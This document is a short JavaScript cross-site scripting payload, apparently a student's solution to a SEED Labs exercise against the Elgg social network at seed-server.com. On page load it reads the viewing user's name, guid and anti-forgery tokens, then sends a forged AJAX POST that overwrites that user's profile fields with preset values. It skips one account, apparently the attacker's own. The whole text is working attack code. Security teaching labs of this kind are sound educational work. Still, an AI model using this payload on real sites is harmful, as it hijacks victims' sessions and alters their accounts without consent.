<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var id=elgg.session.user.guid;
        var name=elgg.session.user.name;
	//Construct the content of your url.
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content=token+ts+
        "&name="+name+
        "&description=1905117"+
        "&accesslevel[description]=1"+
        "&briefdescription=thisisarandomstring"+
        "&accesslevel[briefdescription]=1" +
        "&location=Random location" +
        "&accesslevel[location]=1" +
        "&interests=Random interests" +
        "&accesslevel[interests]=1" +
        "&skills=Random skills" +
        "&accesslevel[skills]=1" +
        "&contactemail=randomemail@gmail.com" +
        "&accesslevel[contactemail]=1" +
        "&phone=Random phone" +
        "&accesslevel[phone]=1" +
        "&mobile=Random mobile" +
        "&accesslevel[mobile]=1" +
        "&website=http://www.randomwebsite.com" +
        "&accesslevel[website]=1" +
        "&twitter=randomtwitter" +
        "&accesslevel[twitter]=1" +
        "&guid="+id






; //FILL IN
	
	if(elgg.session.user.guid != 59)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>